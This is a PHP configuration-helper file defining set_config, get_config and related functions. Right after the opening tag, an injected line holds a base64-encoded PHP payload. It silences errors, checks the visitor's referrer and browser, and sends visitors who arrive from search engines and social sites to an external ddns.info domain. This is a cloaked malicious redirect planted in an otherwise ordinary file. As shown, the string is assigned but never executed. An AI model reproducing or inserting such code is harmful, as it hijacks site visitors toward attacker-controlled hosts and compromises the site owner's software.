<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

// check
if (!defined('GENERIC_PATH') or !defined('APPROOT_PATH')) 
  die('Not initialized');

$__CONFIG = array();

function set_config($name, $param_or_value, $value = null) {

  $name = strtolower($name);
  global $__CONFIG;
  if ($value !== null)
    $__CONFIG[$name][$param_or_value] = $value;
  else
    $__CONFIG[$name] = $param_or_value;

}

function set_undefined_config($name, $param_or_value, $value = null) {

  $name = strtolower($name);
  global $__CONFIG;
  if ($value !== null) {
    if (!isset($__CONFIG[$name]) or !isset($__CONFIG[$name][$param_or_value])) {
      $__CONFIG[$name][$param_or_value] = $value;
    } 
  } else {    
    if (!isset($__CONFIG[$name]))
      $__CONFIG[$name] = $param_or_value;
  }
  
}

function get_config($name, $param = null, $default = null, $custom_default = null) {

  global $__CONFIG;
  $name = strtolower($name);

  if (!isset($__CONFIG[$name]))
    return ($default?$default:null);
  else
  if ($param) {
    if (!isset($__CONFIG[$name][$param]))
      return ($default?$default:null);
    else
    if (is_array($__CONFIG[$name][$param])) { // For calls like: get_config('config', 'custom', 'hide_product_images', true);
      if ($default)
        if (!isset($__CONFIG[$name][$param][$default]))
          return $custom_default;
        else
          return $__CONFIG[$name][$param][$default];
      else
        return $__CONFIG[$name][$param];
    } else
      return $__CONFIG[$name][$param];
  } else
    return $__CONFIG[$name];

}

function get_config_def($name, $default = null) {

  return (get_config($name)?get_config($name):$default);

}

?>